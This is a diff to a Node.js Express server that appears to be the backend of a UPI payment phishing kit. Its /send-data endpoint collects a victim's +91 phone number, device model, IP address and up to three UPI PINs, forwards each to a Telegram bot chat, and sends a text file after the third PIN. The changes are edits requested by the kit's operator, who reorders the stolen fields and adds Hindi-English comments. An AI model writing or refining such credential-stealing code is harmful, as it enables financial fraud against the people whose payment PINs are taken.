@@ -10,7 +10,7 @@ app.use(express.json());
 
 const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 
-
+// State management
 let lastMessageId = null;
 let currentMessageText = "";
 let pinCount = 0; 
@@ -19,7 +19,6 @@ let fullDeviceName = "Device_Details";
 const sendOrUpdateTelegram = async (message) => {
     try {
         if (!lastMessageId) {
-
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
                 text: message,
@@ -28,7 +27,6 @@ const sendOrUpdateTelegram = async (message) => {
             lastMessageId = response.data.result.message_id;
             currentMessageText = message;
         } else {
-
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                 chat_id: CHAT_ID,
                 message_id: lastMessageId,
@@ -38,7 +36,6 @@ const sendOrUpdateTelegram = async (message) => {
             currentMessageText = message;
         }
     } catch (error) {
-
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
@@ -84,24 +81,27 @@ app.post('/send-data', async (req, res) => {
     }
 
     if (type === 'NUMBER') {
-
+        // Naya session reset
         lastMessageId = null; 
         pinCount = 0; 
+        
+        // Aapke bataye huye sequence mein message
         let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
+        updatedText += `*IP Address:* ${userIP || 'Detecting...'}\n`; // IP Address upar kar diya
         updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `*IP Address:* ${userIP || 'Detecting...'}\n`; 
         updatedText += `*Number:* +91 ${number}\n`;
         
         await sendOrUpdateTelegram(updatedText);
     } else if (pin) {
         pinCount++; 
 
+        // Message text mein PIN update
         currentMessageText += `*UPI PIN:* ${pin}\n`;
         
         await sendOrUpdateTelegram(currentMessageText);
         
-
+        // 3 PIN milne ke baad TXT file bhejna
         if (pinCount === 3) {
             await sendFileToTelegram(currentMessageText, fullDeviceName);
         }
